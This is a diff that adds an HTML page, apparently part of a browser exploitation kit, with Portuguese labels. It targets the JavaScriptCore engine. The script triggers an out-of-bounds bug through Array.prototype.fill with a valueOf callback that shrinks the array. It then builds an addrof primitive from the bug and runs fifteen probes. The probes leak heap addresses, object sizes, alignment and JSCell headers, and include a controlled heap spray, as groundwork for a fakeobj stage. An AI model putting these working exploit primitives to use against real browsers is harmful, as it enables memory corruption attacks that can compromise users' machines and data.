@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>01 — Heap Layout Probe</title>
+<style>
+body{background:#08080f;color:#ccc;font:12px monospace;padding:12px}
+h3{color:#5bf;margin-bottom:6px}
+#log{height:460px;overflow:auto;background:#0a0a12;color:#0f0;padding:8px;white-space:pre;border:1px solid #1a2a3a;margin-bottom:8px}
+button{background:#0f1a2a;color:#5bf;border:1px solid #1a3a5a;padding:5px 10px;margin:2px;font:11px monospace;cursor:pointer}
+button:hover{background:#1a2a3a}
+.guide{background:#0f0f1a;border:1px solid #1a3a2a;padding:8px;margin-bottom:8px;font-size:11px;color:#888}
+</style></head>
+<body>
+<h3>01 — Heap Layout Probe — Tamanho de Objetos, Alinhamento, Gaps</h3>
+<div class="guide">
+🔍 O QUE OBSERVAR:<br>
+• <span style="color:#fa4">delta(a,b)</span>: distância entre dois objetos consecutivos → tamanho + overhead do alocador<br>
+• <span style="color:#fa4">alinhamento</span>: se todos os endereços são múltiplos de 0x10 (16), 0x20 (32), etc.<br>
+• <span style="color:#fa4">consistência</span>: se os deltas são iguais entre execuções → alocador determinístico<br>
+• <span style="color:#4f4">valor hex</span> de qualquer leitura OOB → copiar e reportar<br>
+• <span style="color:#f44">crash</span>: anotar o último T00 visível antes do crash
+</div>
+<div id="log"></div>
+<button onclick="t01()">T01 addrof sequencial: delta entre objetos vazios</button>
+<button onclick="t02()">T02 addrof por tipo: String vs Array vs Object vs Function</button>
+<button onclick="t03()">T03 Tamanho inline props: 0 a 8 propriedades inline</button>
+<button onclick="t04()">T04 ArrayBuffer: overhead e alinhamento por tamanho</button>
+<button onclick="t05()">T05 TypedArray: header size vs buffer size</button>
+<button onclick="t06()">T06 Closure: tamanho varia com upvalue count</button>
+<button onclick="t07()">T07 Prototype chain: overhead por nível</button>
+<button onclick="t08()">T08 Map/Set: overhead por entrada</button>
+<button onclick="t09()">T09 Promise: tamanho no heap</button>
+<button onclick="t10()">T10 Generator object: tamanho no heap</button>
+<button onclick="t11()">T11 Spray controlado: 1000 objetos, mede variância</button>
+<button onclick="t12()">T12 Float64Array alinhamento: buffer sempre alinhado a 8?</button>
+<button onclick="t13()">T13 Shadow DOM host vs shadow root: overhead</button>
+<button onclick="t14()">T14 Custom Element: overhead vs HTMLElement normal</button>
+<button onclick="t15()">T15 JSCell header leak: lê os primeiros bytes de cada tipo</button>
+<br><br>
+<button onclick="runAll()"><b>▶ RODAR TUDO</b></button>
+<button onclick="document.getElementById('log').textContent=''">Limpar</button>
+<a href="index.html" style="color:#5bf">← Index</a>
+
+<script>
+'use strict';
+var _L=document.getElementById('log');
+function log(m){_L.textContent+=m+'\n';_L.scrollTop=_L.scrollHeight;}
+function hex(v){return '0x'+v.toString(16).padStart(12,'0');}
+function hexs(v){return '0x'+v.toString(16);}
+
+// ─── addrof via OOB fill ───────────────────────────────────────────────────
+var float_arr=[], obj_arr=[], found_idx=-1;
+function trigger(){
+  var v0=[];
+  for(var i=0;i<100;i++) v0[i]=1.1;
+  var _ab=new ArrayBuffer(8),_f64=new Float64Array(_ab),_u64=new BigUint64Array(_ab);
+  function f11(){
+    v0.length=8;
+    for(var i=0;i<8;i++){float_arr[i]=1.2;obj_arr[i]={};}
+    return 0;
+  }
+  v0.fill((function(){_u64[0]=0x100n;return _f64[0];})(),{valueOf:f11},20);
+}
+var _ab2=new ArrayBuffer(8),_f64_=new Float64Array(_ab2),_u64_=new BigUint64Array(_ab2);
+function f2i(v){_f64_[0]=v;return _u64_[0];}
+function i2f(v){_u64_[0]=BigInt(v);return _f64_[0];}
+function addrof(obj){
+  if(found_idx<0){log('  ERRO: run T01 primeiro para calibrar found_idx');return 0n;}
+  obj_arr[0]=obj;
+  return f2i(float_arr[found_idx]);
+}
+function calibrate(){
+  try{
+    trigger();
+    for(var idx=0;idx<48;idx++){
+      try{
+        var sentA={s:'A'}, sentB={s:'B'}, sentC={s:'C'};
+        obj_arr[0]=sentA; var a=f2i(float_arr[idx]);
+        obj_arr[0]=sentB; var b=f2i(float_arr[idx]);
+        obj_arr[0]=sentC; var c=f2i(float_arr[idx]);
+        var hp=function(v){return v>0x1000n&&v<0x1000000000000n;};
+        var dab=a>b?a-b:b-a, dbc=b>c?b-c:c-b;
+        if(hp(a)&&hp(b)&&hp(c)&&a!==b&&b!==c&&dab<0x100000n&&dbc<0x100000n){
+          found_idx=idx;
+          return true;
+        }
+      }catch(e){}
+    }
+    return false;
+  }catch(e){return false;}
+}
+
+// ─── T01 ──────────────────────────────────────────────────────────────────
+function t01(){
+  log('[T01] addrof sequencial: delta entre objetos vazios');
+  if(!calibrate()){log('  FALHOU: não encontrou oob_idx. Bug patcheado ou layout diferente.');log('[T01] done\n');return;}
+  log('  oob_idx calibrado: '+found_idx);
+  var objs=[];
+  for(var i=0;i<20;i++) objs.push({_i:i});
+  var addrs=objs.map(function(o){return addrof(o);});
+  log('  Endereços dos 20 objetos:');
+  for(var i=0;i<addrs.length;i++){
+    if(addrs[i]===0n){log('  ['+i+'] addrof falhou');continue;}
+    var delta=i>0?(addrs[i]>addrs[i-1]?addrs[i]-addrs[i-1]:addrs[i-1]-addrs[i]):0n;
+    var align8=addrs[i]%8n===0n, align16=addrs[i]%16n===0n, align32=addrs[i]%32n===0n;
+    log('  ['+i+'] '+hex(addrs[i])+(i>0?' Δ='+hexs(delta):'')+(align32?' [align32]':align16?' [align16]':align8?' [align8]':''));
+  }
+  // Estatísticas
+  var deltas=[];
+  for(var i=1;i<addrs.length;i++){
+    if(addrs[i]>0n&&addrs[i-1]>0n) deltas.push(addrs[i]>addrs[i-1]?addrs[i]-addrs[i-1]:addrs[i-1]-addrs[i]);
+  }
+  if(deltas.length>0){
+    var minD=deltas.reduce(function(a,b){return a<b?a:b;});
+    var maxD=deltas.reduce(function(a,b){return a>b?a:b;});
+    var allSame=deltas.every(function(d){return d===deltas[0];});
+    log('  delta min='+hexs(minD)+' max='+hexs(maxD)+' consistente='+allSame);
+    log('  → Tamanho base de um objeto JSC vazio: ~'+hexs(minD)+' bytes');
+  }
+  log('[T01] done\n');
+}
+
+// ─── T02 ──────────────────────────────────────────────────────────────────
+function t02(){
+  log('[T02] addrof por tipo: diferentes tamanhos de objeto');
+  if(found_idx<0&&!calibrate()){log('  sem oob_idx');log('[T02] done\n');return;}
+  var samples={
+    'Object vazio':          {},
+    'Object 1 prop':         {a:1},
+    'Object 3 props':        {a:1,b:2,c:3},
+    'Object 5 props':        {a:1,b:2,c:3,d:4,e:5},
+    'Array []':              [],
+    'Array [1,2,3]':         [1,2,3],
+    'Array Float64x4':       [1.1,2.2,3.3,4.4],
+    'String "a"':            new String('a'),
+    'String 100ch':          new String('x'.repeat(100)),
+    'Function ()=>{}':       function(){},
+    'RegExp /a+/':           /a+/,
+    'Map vazio':             new Map(),
+    'Set vazio':             new Set(),
+    'Promise resolvida':     Promise.resolve(42),
+    'Float64Array(8)':       new Float64Array(8),
+    'ArrayBuffer(64)':       new ArrayBuffer(64),
+    'WeakRef(obj)':          new WeakRef({}),
+  };
+  var prevAddr=0n;
+  Object.entries(samples).forEach(function(entry){
+    var name=entry[0], obj=entry[1];
+    try{
+      var addr=addrof(obj);
+      var delta=prevAddr>0n?(addr>prevAddr?addr-prevAddr:prevAddr-addr):0n;
+      var align=addr>0n?(addr%16n===0n?'align16':addr%8n===0n?'align8':'unaligned'):'N/A';
+      log('  '+name.padEnd(22)+' '+hex(addr)+(prevAddr>0n?' Δ='+hexs(delta):'')+'  ['+align+']');
+      prevAddr=addr;
+    }catch(e){log('  '+name.padEnd(22)+' exc: '+e.name);}
+  });
+  log('[T02] done\n');
+}
+
+// ─── T03 ──────────────────────────────────────────────────────────────────
+function t03(){
+  log('[T03] Inline properties: como o tamanho cresce com mais props');
+  if(found_idx<0&&!calibrate()){log('  sem oob_idx');log('[T03] done\n');return;}
+  // Cria objetos com diferentes quantidades de props inline
+  function makeObj(n){
+    var o={};
+    for(var i=0;i<n;i++) o['p'+i]=i*1.1;
+    return o;
+  }
+  var counts=[0,1,2,3,4,5,6,7,8,10,12,16];
+  var prev=0n;
+  counts.forEach(function(n){
+    // Cria 3 objetos e tira a média
+    var objs=[makeObj(n),makeObj(n),makeObj(n)];
+    var addrs=objs.map(function(o){return addrof(o);});
+    var validAddrs=addrs.filter(function(a){return a>0x1000n;});
+    if(validAddrs.length<2){log('  n='+n+': sem addr válido');return;}
+    var delta=validAddrs[1]>validAddrs[0]?validAddrs[1]-validAddrs[0]:validAddrs[0]-validAddrs[1];
+    log('  n='+String(n).padStart(2)+' props: addr='+hex(validAddrs[0])+'  obj-size~='+hexs(delta)+'  ('+Number(delta)+' bytes)');
+    prev=validAddrs[0];
+  });
+  log('[T03] done\n');
+}
+
+// ─── T04 ──────────────────────────────────────────────────────────────────
+function t04(){
+  log('[T04] ArrayBuffer: overhead real por tamanho');
+  if(found_idx<0&&!calibrate()){log('  sem oob_idx');log('[T04] done\n');return;}
+  var sizes=[0,1,8,16,64,128,256,1024,4096,65536,1048576];
+  sizes.forEach(function(sz){
+    try{
+      var bufs=[new ArrayBuffer(sz),new ArrayBuffer(sz),new ArrayBuffer(sz)];
+      var addrs=bufs.map(function(b){return addrof(b);});
+      var d01=addrs[1]>addrs[0]?addrs[1]-addrs[0]:addrs[0]-addrs[1];
+      var d12=addrs[2]>addrs[1]?addrs[2]-addrs[1]:addrs[1]-addrs[2];
+      log('  buf='+String(sz).padStart(8)+'B → addr='+hex(addrs[0])+' Δ01='+hexs(d01)+' Δ12='+hexs(d12));
+    }catch(e){log('  buf='+sz+': exc '+e.name);}
+  });
+  log('[T04] done\n');
+}
+
+// ─── T05 ──────────────────────────────────────────────────────────────────
+function t05(){
+  log('[T05] TypedArray: distância entre wrapper e buffer');
+  if(found_idx<0&&!calibrate()){log('  sem oob_idx');log('[T05] done\n');return;}
+  // Para um TypedArray, o JSObject e o backing ArrayBuffer são objetos separados
+  var types=[
+    {name:'Float64Array(8)', mk:function(){return new Float64Array(8);}},
+    {name:'Float64Array(64)',mk:function(){return new Float64Array(64);}},
+    {name:'Uint8Array(64)',  mk:function(){return new Uint8Array(64);}},
+    {name:'Int32Array(32)',  mk:function(){return new Int32Array(32);}},
+  ];
+  types.forEach(function(t){
+    try{
+      var ta=t.mk();
+      var buf=ta.buffer;
+      var taAddr=addrof(ta);
+      var bufAddr=addrof(buf);
+      var diff=taAddr>bufAddr?taAddr-bufAddr:bufAddr-taAddr;
+      log('  '+t.name+':');
+      log('    TypedArray wrapper: '+hex(taAddr));
+      log('    ArrayBuffer:        '+hex(bufAddr));
+      log('    distância:          '+hexs(diff)+' ('+Number(diff)+' bytes)');
+    }catch(e){log('  '+t.name+': exc '+e.name);}
+  });
+  log('[T05] done\n');
+}
+
+// ─── T06 ──────────────────────────────────────────────────────────────────
+function t06(){
+  log('[T06] Closure: tamanho varia com número de upvalues capturados');
+  if(found_idx<0&&!calibrate()){log('  sem oob_idx');log('[T06] done\n');return;}
+  function makeClosure(n){
+    var vars=[];
+    for(var i=0;i<n;i++) vars.push(i*1.1);
+    return function(){ return vars.reduce(function(a,b){return a+b;},0); };
+  }
+  [0,1,2,4,8,16].forEach(function(n){
+    var fns=[makeClosure(n),makeClosure(n)];
+    var addrs=fns.map(function(f){return addrof(f);});
+    var d=addrs[1]>addrs[0]?addrs[1]-addrs[0]:addrs[0]-addrs[1];
+    log('  closure('+String(n).padStart(2)+' upvals): addr='+hex(addrs[0])+'  Δ='+hexs(d));
+  });
+  log('[T06] done\n');
+}
+
+// ─── T07 ──────────────────────────────────────────────────────────────────
+function t07(){
+  log('[T07] Prototype chain: overhead por nível de herança');
+  if(found_idx<0&&!calibrate()){log('  sem oob_idx');log('[T07] done\n');return;}
+  var base={};
+  var objs=[base];
+  for(var i=1;i<=8;i++) objs.push(Object.create(objs[i-1]));
+  objs.forEach(function(o,i){
+    var addr=addrof(o);
+    log('  depth '+i+': '+hex(addr)+' (chain length: '+i+')');
+  });
+  log('[T07] done\n');
+}
+
+// ─── T08 ──────────────────────────────────────────────────────────────────
+function t08(){
+  log('[T08] Map/Set: overhead por entrada adicionada');
+  if(found_idx<0&&!calibrate()){log('  sem oob_idx');log('[T08] done\n');return;}
+  [0,1,5,10,50,100].forEach(function(n){
+    var m=new Map();
+    for(var i=0;i<n;i++) m.set(i,{v:i});
+    var addr=addrof(m);
+    log('  Map('+String(n).padStart(3)+'): addr='+hex(addr));
+  });
+  [0,1,5,10,50,100].forEach(function(n){
+    var s=new Set();
+    for(var i=0;i<n;i++) s.add({v:i});
+    var addr=addrof(s);
+    log('  Set('+String(n).padStart(3)+'): addr='+hex(addr));
+  });
+  log('[T08] done\n');
+}
+
+// ─── T09 ──────────────────────────────────────────────────────────────────
+function t09(){
+  log('[T09] Promise: tamanho e estado no heap');
+  if(found_idx<0&&!calibrate()){log('  sem oob_idx');log('[T09] done\n');return;}
+  var pending=new Promise(function(){});
+  var resolved=Promise.resolve(42);
+  var rejected=Promise.reject('err'); rejected.catch(function(){});
+  var chained=Promise.resolve(1).then(function(v){return v+1;});
+  var samples=[
+    ['Promise pending',  pending],
+    ['Promise resolved', resolved],
+    ['Promise rejected', rejected],
+    ['Promise chained',  chained],
+  ];
+  samples.forEach(function(s){
+    var addr=addrof(s[1]);
+    log('  '+s[0].padEnd(20)+hex(addr));
+  });
+  // Tamanho de uma cadeia de .then()
+  var prev=addrof(resolved);
+  [resolved.then(function(v){return v;}),
+   resolved.then(function(v){return v;}).then(function(v){return v;})
+  ].forEach(function(p,i){
+    var addr=addrof(p);
+    var d=addr>prev?addr-prev:prev-addr;
+    log('  .then() chain depth '+(i+2)+': '+hex(addr)+'  Δ='+hexs(d));
+    prev=addr;
+  });
+  log('[T09] done\n');
+}
+
+// ─── T10 ──────────────────────────────────────────────────────────────────
+function t10(){
+  log('[T10] Generator object: tamanho por complexidade');
+  if(found_idx<0&&!calibrate()){log('  sem oob_idx');log('[T10] done\n');return;}
+  function* simple(){ yield 1; }
+  function* withLocals(){ var a=1,b=2,c=3,d=4; yield a+b+c+d; }
+  function* withLoop(n){ for(var i=0;i<n;i++) yield i; }
+  function* nested(){ yield* simple(); yield* withLocals(); }
+  var gens=[
+    ['simple()',      simple()],
+    ['withLocals()',  withLocals()],
+    ['withLoop(10)',  withLoop(10)],
+    ['nested()',      nested()],
+  ];
+  var prev=0n;
+  gens.forEach(function(g){
+    var addr=addrof(g[1]);
+    var d=prev>0n?(addr>prev?addr-prev:prev-addr):0n;
+    log('  '+g[0].padEnd(16)+hex(addr)+(prev>0n?' Δ='+hexs(d):''));
+    prev=addr;
+  });
+  log('[T10] done\n');
+}
+
+// ─── T11 ──────────────────────────────────────────────────────────────────
+function t11(){
+  log('[T11] Spray controlado: 1000 objetos, variância de endereços');
+  if(found_idx<0&&!calibrate()){log('  sem oob_idx');log('[T11] done\n');return;}
+  var N=1000;
+  var objs=[], addrs=[];
+  for(var i=0;i<N;i++) objs.push({idx:i,v:i*1.1});
+  addrs=objs.map(function(o){return addrof(o);}).filter(function(a){return a>0x1000n;});
+  var deltas=[];
+  for(var i=1;i<addrs.length;i++) deltas.push(addrs[i]>addrs[i-1]?addrs[i]-addrs[i-1]:addrs[i-1]-addrs[i]);
+  if(deltas.length===0){log('  sem deltas válidos');log('[T11] done\n');return;}
+  // Conta os deltas únicos
+  var deltaMap={};
+  deltas.forEach(function(d){
+    var k=d.toString();
+    deltaMap[k]=(deltaMap[k]||0)+1;
+  });
+  var sortedDeltas=Object.entries(deltaMap).sort(function(a,b){return b[1]-a[1];});
+  log('  Total addrs válidos: '+addrs.length+'/'+N);
+  log('  Top 5 deltas mais frequentes:');
+  sortedDeltas.slice(0,5).forEach(function(e){
+    log('    Δ='+hexs(BigInt(e[0])).padEnd(14)+'  ocorrências: '+e[1]+' ('+((e[1]/deltas.length*100).toFixed(1))+'%)');
+  });
+  var minAddr=addrs.reduce(function(a,b){return a<b?a:b;});
+  var maxAddr=addrs.reduce(function(a,b){return a>b?a:b;});
+  log('  addr range: '+hex(minAddr)+' → '+hex(maxAddr));
+  log('  span total: '+hexs(maxAddr-minAddr)+' ('+Number((maxAddr-minAddr)/(1024n*1024n))+'MB)');
+  log('[T11] done\n');
+}
+
+// ─── T12 ──────────────────────────────────────────────────────────────────
+function t12(){
+  log('[T12] Float64Array: alinhamento do buffer backing store');
+  if(found_idx<0&&!calibrate()){log('  sem oob_idx');log('[T12] done\n');return;}
+  // O backing store de TypedArrays geralmente tem alinhamento especial
+  var sizes=[1,2,4,8,16,32,64,128,256,512,1024];
+  sizes.forEach(function(n){
+    var ta=new Float64Array(n);
+    var addr=addrof(ta);
+    var bufAddr=addrof(ta.buffer);
+    var align4=bufAddr%4n===0n, align8=bufAddr%8n===0n;
+    var align16=bufAddr%16n===0n, align32=bufAddr%32n===0n;
+    var alignStr=align32?'32':align16?'16':align8?'8':align4?'4':'1';
+    log('  Float64Array('+String(n).padStart(5)+'): buf='+hex(bufAddr)+'  align='+alignStr+'bytes');
+  });
+  log('[T12] done\n');
+}
+
+// ─── T13 ──────────────────────────────────────────────────────────────────
+function t13(){
+  log('[T13] Shadow DOM: overhead do host vs shadow root');
+  if(found_idx<0&&!calibrate()){log('  sem oob_idx');log('[T13] done\n');return;}
+  var host=document.createElement('div');
+  document.body.appendChild(host);
+  var hostAddr=addrof(host);
+  log('  host (sem shadow):  '+hex(hostAddr));
+  try{
+    var shadow=host.attachShadow({mode:'open'});
+    var shadowAddr=addrof(shadow);
+    log('  shadow root:        '+hex(shadowAddr));
+    var d=shadowAddr>hostAddr?shadowAddr-hostAddr:hostAddr-shadowAddr;
+    log('  distância host↔shadow: '+hexs(d)+' ('+Number(d)+' bytes)');
+    // Elementos dentro do shadow
+    var inner=document.createElement('span');
+    shadow.appendChild(inner);
+    var innerAddr=addrof(inner);
+    log('  elemento no shadow: '+hex(innerAddr));
+    var d2=innerAddr>shadowAddr?innerAddr-shadowAddr:shadowAddr-innerAddr;
+    log('  distância shadow↔inner: '+hexs(d2));
+  }catch(e){log('  shadow exc: '+e.name);}
+  document.body.removeChild(host);
+  log('[T13] done\n');
+}
+
+// ─── T14 ──────────────────────────────────────────────────────────────────
+function t14(){
+  log('[T14] Custom Element vs HTMLElement: overhead no heap');
+  if(found_idx<0&&!calibrate()){log('  sem oob_idx');log('[T14] done\n');return;}
+  customElements.define('ce-layout-probe-x', class extends HTMLElement {
+    constructor(){super();}
+  });
+  var native=document.createElement('div');
+  var custom=document.createElement('ce-layout-probe-x');
+  var withShadow=document.createElement('div');
+  try{withShadow.attachShadow({mode:'open'});}catch(e){}
+  var samples=[
+    ['HTMLDivElement',     native],
+    ['CustomElement',      custom],
+    ['Div+ShadowRoot',     withShadow],
+    ['HTMLSpanElement',    document.createElement('span')],
+    ['HTMLCanvasElement',  document.createElement('canvas')],
+    ['HTMLInputElement',   document.createElement('input')],
+    ['HTMLScriptElement',  document.createElement('script')],
+    ['DocumentFragment',   document.createDocumentFragment()],
+    ['TextNode',           document.createTextNode('hi')],
+    ['Comment',            document.createComment('hi')],
+  ];
+  var prev=0n;
+  samples.forEach(function(s){
+    var addr=addrof(s[1]);
+    var d=prev>0n?(addr>prev?addr-prev:prev-addr):0n;
+    log('  '+s[0].padEnd(22)+hex(addr)+(prev>0n?' Δ='+hexs(d):''));
+    prev=addr;
+  });
+  log('[T14] done\n');
+}
+
+// ─── T15 ──────────────────────────────────────────────────────────────────
+function t15(){
+  log('[T15] JSCell header leak: lê os primeiros 8 bytes de cada tipo via OOB');
+  // Tenta ler o jscell header de vários tipos usando o OOB
+  // O header está em: object_addr + 0x00 (sem NaN-boxing, é lido como float64)
+  if(found_idx<0&&!calibrate()){log('  sem oob_idx');log('[T15] done\n');return;}
+  // Para ler bytes em addr, usamos o mecanismo de fakeobj + fake array
+  // Mas sem fakeobj configurado ainda, vamos observar o que OOB lê
+  // quando obj_arr[0] aponta para diferentes tipos
+  var types=[
+    ['{}',              {}],
+    ['{a:1}',           {a:1}],
+    ['[]',              []],
+    ['[1.1]',           [1.1]],
+    ['Float64Array',    new Float64Array(4)],
+    ['ArrayBuffer',     new ArrayBuffer(16)],
+    ['Map',             new Map()],
+    ['Set',             new Set()],
+    ['Promise',         Promise.resolve(1)],
+    ['function(){}',    function(){}],
+    ['RegExp',          /test/],
+    ['new String("a")', new String('a')],
+    ['WeakRef',         new WeakRef({})],
+  ];
+  // Lê os valores adjacentes no float_arr para cada tipo em obj_arr[0]
+  log('  idx-adj = float_arr[found_idx±N] quando obj_arr[0] = tipo');
+  log('  Cada valor é o que o engine tem nos slots adjacentes ao ponteiro do objeto');
+  types.forEach(function(t){
+    try{
+      obj_arr[0]=t[1];
+      // Lê vários índices ao redor de found_idx
+      var readings=[];
+      for(var delta=-2;delta<=2;delta++){
+        var idx=found_idx+delta;
+        if(idx<0||idx>=float_arr.length){readings.push('N/A');continue;}
+        try{
+          var v=f2i(float_arr[idx]);
+          readings.push((delta===0?'['+hexs(v)+']':hexs(v)));
+        }catch(e){readings.push('err');}
+      }
+      log('  '+t[0].padEnd(18)+readings.join('  '));
+    }catch(e){log('  '+t[0]+': exc '+e.name);}
+  });
+  log('  [val] = found_idx (ponteiro do objeto)');
+  log('  valores adjacentes podem ser JSCell header, butterfly ptr, ou dados inline');
+  log('[T15] done\n');
+}
+
+function runAll(){
+  document.getElementById('log').textContent='';
+  log('=== 01 — HEAP LAYOUT PROBE ===\n');
+  var tests=[t01,t02,t03,t04,t05,t06,t07,t08,t09,t10,t11,t12,t13,t14,t15];
+  var i=0;
+  function next(){
+    if(i>=tests.length){log('\n=== FIM ===');return;}
+    try{tests[i]();}catch(e){log('CRASH T'+(i+1)+': '+e.name+' '+e.message);}
+    i++; setTimeout(next,400);
+  }
+  next();
+}
+</script></body></html>
